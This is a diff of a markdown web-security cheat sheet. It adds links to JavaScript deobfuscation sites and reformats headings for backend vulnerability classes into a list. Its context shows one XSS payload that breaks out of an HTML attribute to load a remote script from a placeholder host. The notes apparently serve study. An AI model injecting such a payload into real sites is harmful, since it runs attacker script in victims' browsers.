@@ -47,13 +47,20 @@ three main categories:
 ```html
 "><script src=//www.example.com/exploit.js></script>
 ```
+## Deobfuscation Websites
 
+- [JS Console](https://jsconsole.com)
+- [Prettier](https://prettier.io/playground/)
+- [Beautifier](https://beautifier.io/)
+- [JSNice](http://www.jsnice.org/)
 # BackEnd Vulnerabilities
-## Broken Auth/Access Control (Bypass login)
-## Malicious File Upload
-## Command Injection
-## SQL Injection (SQLi)
-## CVEs
+- Broken Auth/Access Control (Bypass login)
+- Malicious File Upload
+- Command Injection
+--## SQL Injection (SQLi)
+- CVEs
+
+
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTMzODgwMzA1MywxOTY1ODU2ODYyXX0=
+eyJoaXN0b3J5IjpbMTAzMTc1NzUyMywxOTY1ODU2ODYyXX0=
 -->
